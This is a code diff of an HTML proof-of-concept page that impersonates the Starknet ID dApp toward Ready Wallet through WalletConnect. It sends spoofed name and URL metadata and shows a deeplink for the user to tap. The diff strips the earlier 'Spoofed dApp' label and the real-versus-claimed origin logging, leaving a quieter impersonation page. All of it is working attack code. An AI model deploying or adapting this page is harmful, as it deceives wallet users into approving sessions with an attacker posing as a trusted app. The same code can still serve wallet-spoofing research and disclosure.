@@ -2,91 +2,56 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Ready Wallet Origin Spoof PoC</title>
+  <title>Ready Wallet PoC</title>
 </head>
 <body>
-  <h1>Ready Wallet Origin Spoof PoC</h1>
-  <button id="connect">Generate URI</button>
-  <br><br>
-  <a id="deeplink" href="#" style="display:none; padding:10px; background:#000; color:#fff; border-radius:8px;">
-    👆 TAP HERE TO OPEN READY WALLET
-  </a>
+  <h1>Ready Wallet PoC</h1>
+  <button id="connect">Connect</button>
+  <div id="link"></div>
   <pre id="log"></pre>
 
   <script type="module">
     import { UniversalProvider } from 'https://esm.sh/@walletconnect/universal-provider@2.17.0';
 
-    const REAL_ORIGIN = location.origin;
-    const CLAIMED_URL = 'https://app.starknet.id';
-    const CLAIMED_NAME = 'Starknet ID';
-
-    const log = (msg) => {
-      document.getElementById('log').textContent += msg + '\n';
-    };
+    const log = (msg) => document.getElementById('log').textContent += msg + '\n';
 
     document.getElementById('connect').onclick = async () => {
-      try {
-        log('Initializing...');
+      log('Loading...');
 
-        const provider = await UniversalProvider.init({
-          projectId: '2f05ae7f1116030fde2d36508f472bfb',
-          metadata: {
-            name: CLAIMED_NAME,
-            description: 'Spoofed dApp',
-            url: CLAIMED_URL,
-            icons: []
-          },
-          relayUrl: 'wss://relay.walletconnect.com'
-        });
+      const provider = await UniversalProvider.init({
+        projectId: '2f05ae7f1116030fde2d36508f472bfb',
+        metadata: {
+          name: 'Starknet ID',
+          url: 'https://app.starknet.id',
+          description: '',
+          icons: []
+        }
+      });
 
-        log('Provider ready!');
-
-        const { uri, approval } = await provider.client.connect({
-          requiredNamespaces: {
-            starknet: {
-              chains: ['starknet:SNMAIN'],
-              methods: [
-                'starknet_account',
-                'starknet_requestAddInvokeTransaction'
-              ],
-              events: ['accountsChanged', 'chainChanged']
-            }
-          }
-        });
-
-        if (uri) {
-          log('Real origin  : ' + REAL_ORIGIN);
-          log('Claimed URL  : ' + CLAIMED_URL);
-          log('');
-          log('URI ready! Tap button di bawah untuk buka Ready Wallet');
-
-          // Tampilkan sebagai link yang bisa di tap manual
-          const deeplink = document.getElementById('deeplink');
-          deeplink.href = `ready://wc?uri=${encodeURIComponent(uri)}`;
-          deeplink.style.display = 'block';
-
-          log('Waiting for approval...');
-
-          try {
-            const session = await approval();
-            log('');
-            log('=== SESSION APPROVED! ===');
-
-            const accounts = session?.namespaces?.starknet?.accounts;
-            if (accounts?.length > 0) {
-              const account = accounts[0].split(':')[2];
-              log('Account: ' + account);
-              log('');
-              log('Domain shown in Ready = ' + CLAIMED_URL + ' ?');
-              log('Real domain           = ' + REAL_ORIGIN);
-            }
-          } catch(e) {
-            log('Approval: ' + e.message);
+      const { uri, approval } = await provider.client.connect({
+        requiredNamespaces: {
+          starknet: {
+            chains: ['starknet:SNMAIN'],
+            methods: ['starknet_account'],
+            events: ['accountsChanged']
           }
         }
-      } catch(e) {
-        log('Error: ' + e.message);
-      }
+      });
+
+      log('URI ready!');
+
+      // Tampilkan link
+      document.getElementById('link').innerHTML = 
+        `<a href="ready://wc?uri=${encodeURIComponent(uri)}" 
+            style="font-size:20px; padding:12px; background:blue; 
+                   color:white; display:block; margin:10px 0; 
+                   border-radius:8px; text-align:center;">
+          Buka Ready Wallet
+        </a>`;
+
+      const session = await approval();
+      log('Connected!');
+      log('Account: ' + session.namespaces.starknet.accounts[0]);
     };
   </script>
 </body>
